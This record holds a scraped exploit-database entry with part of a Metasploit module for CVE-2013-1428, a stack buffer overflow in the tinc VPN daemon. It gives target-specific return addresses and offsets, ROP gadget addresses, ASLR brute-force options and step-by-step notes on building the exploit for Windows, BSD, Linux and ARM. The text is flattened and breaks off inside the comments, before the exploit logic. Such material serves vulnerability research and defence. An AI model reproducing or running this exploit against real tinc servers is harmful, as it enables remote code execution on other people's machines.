{
    "text": "vul_name : Tincd Post-Authentication Remote TCP Stack Buffer Overflow ， vul_cve : CVE-2013-1428 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'securerandom' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = AverageRanking ， include Msf : Exploit : EXE ， include Msf : Exploit : Remote : TincdExploitClient ， super ( update_info ( info ,  ， 'Name' => 'Tincd Post-Authentication Remote TCP Stack Buffer Overflow' ,  ， 'Description' => %q{ ， This module exploits a stack buffer overflow in Tinc's tincd ， service. After authentication , a specially crafted tcp packet ( default port 655 )  ， leads to a buffer overflow and allows to execute arbitrary code. This module has ， been tested with tinc-1.1pre6 on Windows XP ( custom calc payload ) and Windows 7 ，  ( windows/meterpreter/reverse_tcp )  , and tinc version 1.0.19 from the ports of ， FreeBSD 9.1-RELEASE # 0 and various other OS , see targets. The exploit probably works ， A manually compiled version ( 1.1.pre6 ) on Ubuntu 12.10 with gcc 4.7.2 seems to ， be a non-exploitable crash due to calls to _memcpy_chk depending on how tincd ， was compiled. Bug got fixed in version 1.0.21/1.1pre7. While writing this module ， it was recommended to the maintainer to start using DEP/ASLR and other protection ， mechanisms. ， } ,  ， 'Author' => ，  [  ，  # PoC changes ( mostly reliability )  , port python to ruby , exploitation including ROP , support for all OS , metasploit module ， 'Tobias Ospelt <tobias [ at ] modzero.ch>' ,  #  @ floyd_ch ，  # original finding , python PoC crash ， 'Martin Schobert <schobert [ at ] modzero.ch>' #  @ nitram2342 ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-1428' ]  ,  ，  [ 'OSVDB' , '92653' ]  ,  ，  [ 'BID' , '59369' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'process' ， } ,  ， 'Payload' => ， { ， 'Space' => 1675 ,  ， 'DisableNops' => true ， } ,  ， 'Privileged' => true ,  ， 'Targets' => ，  [  ，  # full exploitation x86 :  ，  [ 'Windows XP x86 , tinc 1.1.pre6 ( exe installer ) ' , { 'Platform' => 'win' , 'Ret' => 0x0041CAA6 , 'offset' => 1676 } ]  ,  ，  [ 'Windows 7 x86 , tinc 1.1.pre6 ( exe installer ) ' , { 'Platform' => 'win' , 'Ret' => 0x0041CAA6 , 'offset' => 1676 } ]  ,  ，  [ 'FreeBSD 9.1-RELEASE # 0 x86 , tinc 1.0.19 ( ports ) ' , { 'Platform' => 'bsd' , 'Ret' => 0x0804BABB , 'offset' => 1676 } ]  ,  ，  [ 'Fedora 19 x86 ROP ( NX )  , write binary to disk payloads , tinc 1.0.20 ( manual compile ) ' , { ， 'Platform' => 'linux' , 'Arch' => ARCH_X86 , 'Ret' => 0x4d10ee87 , 'offset' => 1676 } ，  ]  ,  ，  [ 'Fedora 19 x86 ROP ( NX )  , CMD exec payload , tinc 1.0.20 ( manual compile ) ' , { ， 'Platform' => 'unix' , 'Arch' => ARCH_CMD , 'Ret' => 0x4d10ee87 , 'offset' => 1676 } ，  ]  ,  ，  [ 'Archlinux 2013.04.01 x86 , tinc 1.0.20 ( manual compile ) ' , { 'Platform' => 'linux' , 'Ret' => 0x08065929 , 'offset' => 1676 } ]  ,  ，  [ 'OpenSuse 11.2 x86 , tinc 1.0.20 ( manual compile ) ' , { 'Platform' => 'linux' , 'Ret' => 0x0804b07f , 'offset' => 1676 } ]  ,  ，  # full exploitation ARM :  ，  [ 'Pidora 18 ARM ROP ( NX ) /ASLR brute force , write binary to disk payloads , tinc 1.0.20 ( manual compile with restarting daemon ) ' , { ， 'Platform' => 'linux' , 'Arch' => ARCH_ARMLE , 'Ret' => 0x00015cb4 , 'offset' => 1668 } ，  ]  ,  ，  [ 'Pidora 18 ARM ROP ( NX ) /ASLR brute force , CMD exec payload , tinc 1.0.20 ( manual compile with restarting daemon ) ' , { ， 'Platform' => 'linux' , 'Arch' => ARCH_CMD , 'Ret' => 0x00015cb4 , 'offset' => 1668 } ，  ]  ,  ，  # crash only :  ，  [ 'Crash only : Ubuntu 12.10 x86 , tinc 1.1.pre6 ( apt-get or manual compile ) ' , { 'Platform' => 'linux' , 'Ret' => 0x0041CAA6 , 'offset' => 1676 } ]  ,  ，  [ 'Crash only : Fedora 16 x86 , tinc 1.0.19 ( yum ) ' , { 'Platform' => 'linux' , 'Ret' => 0x0041CAA6 , 'offset' => 1676 } ]  ,  ，  [ 'Crash only : OpenSuse 11.2 x86 , tinc 1.0.16 ( rpm package ) ' , { 'Platform' => 'linux' , 'Ret' => 0x0041CAA6 , 'offset' => 1676 } ]  ,  ，  [ 'Crash only : Debian 7.3 ARM , tinc 1.0.19 ( apt-get ) ' , { 'Platform' => 'linux' , 'Ret' => 0x9000 , 'offset' => 1668 } ]  ，  ]  ,  ， 'DisclosureDate' => 'Apr 22 2013' ,  # finding , msf module : Dec 2013 ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  # Only for shellcodes that write binary to disk ，  # Has to be short , usually either . or /tmp works ，  # /tmp could be mounted as noexec ，  # . is usually only working if tincd is running as root ， OptString.new ( 'BINARY_DROP_LOCATION' ,  [ false , 'Short location to drop executable on server , usually /tmp or .' , '/tmp' ]  )  ,  ， OptInt.new ( 'BRUTEFORCE_TRIES' ,  [ false , 'How many brute force tries ( ASLR brute force ) ' , 200 ]  )  ,  ， OptInt.new ( 'WAIT' ,  [ false , 'Waiting time for server daemon restart ( ASLR brute force ) ' , 3 ]  )  ，  ]  , self ， end ， def exploit ，  # x86 ，  # WINDOWS XP and 7 full exploitation ，  # Simple , we only need some mona.py magic ，  # C : \\Program Files\\tinc>\"C : \\Program Files\\Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe\" \"C : \\Program Files\\tinc\\tincd.exe -D -d 5\" ，  #  ! mona config -set workingfolder c : \\logs\\%p ，  #  ! mona pc 1682 ，  # -> C : \\logs\\tincd\\pattern ，  #  ! mona findmsp ，  # Straight forward , when we overwrite EIP the second value ，  # on the stack is pointing to our payload. ，  #  ! mona findwild -o -type instr -s \"pop r32 # ret\" ，  # FREEBSD full exploitation ，  # Same offset as windows , same exploitation method ，  # But we needed a new pop r32 # ret for the freebsd version ，  # No mona.py help on bsd or linux so :  ，  # - Dumped .text part of tincd binary in gdb ，  # - Search in hex editor for opcodes for \"pop r32 # ret\" :  ，  # 58c3 , 59c3 , . , 5fc3 ，  # - Found a couple of 5dc3. ret = start of .text + offset in hex editor ，  # - 0x0804BABB works very well ，  # UBUNTU crash only ，  # Manually compiled version ( 1.1.pre6 ) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash , because ，  # the bug is in a fixed size ( MAXSIZE ) struct member variable. The size of the destination is known ，  # at compile time. gcc is introducing a call to _memcpy_chk :  ，  # memcpy_chk does a _chk_fail call if the destination buffer is smaller than the source buffer. Therefore it will print ，  # buffer overflow detected and terminate ( SIGABRT ) . The same result for tincd 10.0.19 which can be installed ，  # from the repository. It might be exploitable for versions compiled with an older version of gcc. ，  # memcpy_chk seems to be in gcc since 2005 :  ，  # OPENSUSE ，  # OpenSuse 11.2 ，  # Installation as described on the tincd website. For 11.2 there are two versions. ，  # Decided for 1.0.16 as this is a vulnerable version ，  # wget \" ，  # rpm -i tinc-1.0.16-3.1.i586.rpm ，  # Again , strace shows us that the buffer overflow was detected ( see Ubuntu )  ，  # writev ( 2 ,  [ {\" \" , 4} , {\"buffer overflow detected\" , 24} , {\" : \" , 6} , {\"tincd\" , 5} , {\" terminated\\n\" , 12} ]  , 5 ) = 51 ，  # So a crash-only non-exploitable bof here. So let's go for manual install :  ，  # wget ' ，  # yast -i gcc zlib zlib-devel echo \"yast is still ugly\" zypper install lzo-devel libopenssl-devel make make make install ，  # Exploitable. Let's see :  ，  # tincd is mapped at 0x8048000. There is a 5d3c at offset 307f in the tincd binary. this means :  ，  # the offset to pop ebp ; ret is 0x0804b07f ，  # FEDORA ，  # Fedora 16 ，  # yum has version 1.0.19 ，  # yum install tinc ，  # Non-exploitable crash , see Ubuntu. Strace tells us :  ，  # writev ( 2 ,  [ {\" \" , 4} , {\"buffer overflow detected\" , 24} , {\" : \" , 6} , {\"tincd\" , 5} , {\" terminated\\n\" , 12} ]  , 5 ) = 51 ，  # About yum : Fedora 17 has fixed version 1.0.21 , Fedora 19 fixed version 1.0.23 ，  # Manual compile went on with Fedora 19 ，  # wget ' ，  # yum install gcc zlib-devel.i686 lzo-devel.i686 openssl-devel.i686 ./configure make make install ，  # Don't forget to stop firewalld for testing , as the port is still closed otherwise ，  #  # hardening-check tincd ，  # tincd :  ，  # Position Independent Executable : no , normal executable !  ，  # Stack protected : no , not found !  ，  # Fortify Source functions : no , only unprotected functions found !  ，  # Read-only relocations : yes ，  # Immediate binding : no , not found !  ，  # Running this module with target set to Windows :  ，  # Program received signal SIGSEGV , Segmentation fault. ，  # 0x0041caa6 in ? (  )  ，  # well and that's our windows offset. ，  #  ( gdb ) info proc mappings ，  # 0x8048000 0x8068000 0x20000 0x0 /usr/local/sbin/tincd ，  # After finding a normal 5DC3 ( pop ebp # ret ) at offset 69c3 of the binary we ，  # can try to execute the payload on the stack , but :  ，  #  ( gdb ) stepi ，  # Program received signal SIGSEGV , Segmentation fault. ，  # 0x08e8ee08 in ? (  )  ，  # Digging deeper we find :  ，  # dmesg | grep protection ，  #  [ 0.000000 ] NX ( Execute Disable ) protection : active ，  # or :  ，  #  # objdump -x /usr/local/sbin/tincd ，  #  [ . ] STACK off 0x00000000 vaddr 0x00000000 paddr 0x00000000 align 24 ，  # filesz 0x00000000 memsz 0x00000000 flags rw- ，  # or :  ，  # Time for ROP ，  # To start the ROP we need a POP r32 # POP ESP # RET ( using the first four bytes of the shellcode ，  # as a pointer to instructions ) . Was lucky after some searching :  ，  #  ( gdb ) x/10i 0x4d10ee87 ，  # 0x4d10ee87 : pop %ebx ，  # 0x4d10ee88 : mov $ 0xf5d299dd , %eax ，  # 0x4d10ee8d : rcr %cl , %al ，  # 0x4d10ee8f : pop %esp ，  # 0x4d10ee90 : ret ，  # ARCHLINUX ，  # archlinux-2013.04.01 pacman has fixed version 1.0.23 , so went for manual compile :  ，  # wget ' ，  # pacman -S gcc zlib lzo openssl make ./configure make make install ，  # Offset in binary to 58c3 : 0x1D929 + tincd is mapped at starting address 0x8048000 ，  # ->Ret : 0x8065929 ，  # No NX protection , it simply runs the shellcode :  )  ，  # ARM ，  # ARM Pidora 18 ( Raspberry Pi Fedora Remix ) on a physical Raspberry Pi ，  # Although this is more for the interested reader , as Pidora development ，  # already stopped. Raspberry Pi's are ARM1176JZF-S ( 700 MHz ) CPUs ，  # meaning it's an ARMv6 architecture ，  # yum has fixed version 1.0.21 , so went for manual compile :  ，  # wget ' ，  # yum install gdb gcc zlib-devel lzo-devel openssl-devel ./configure make make install ，  # Is the binary protected? ，  # wget \" chmod +x checksec.sh ，  #  # ./checksec.sh -file /usr/local/sbin/tincd ，  # RELRO STACK CANARY NX PIE RPATH RUNPATH FILE ，  # No RELRO No canary found NX enabled No PIE No RPATH No RUNPATH /usr/local/sbin/tincd ，  # so again NX. but what about the system things? ，  # cat /proc/sys/kernel/randomize_va_space ，  # 2 ，  # -> \"Randomize the positions of the stack , VDSO page , shared memory regions , and the data segment. ，  # This is the default setting.\"",
    "time": "2014.12.02"
}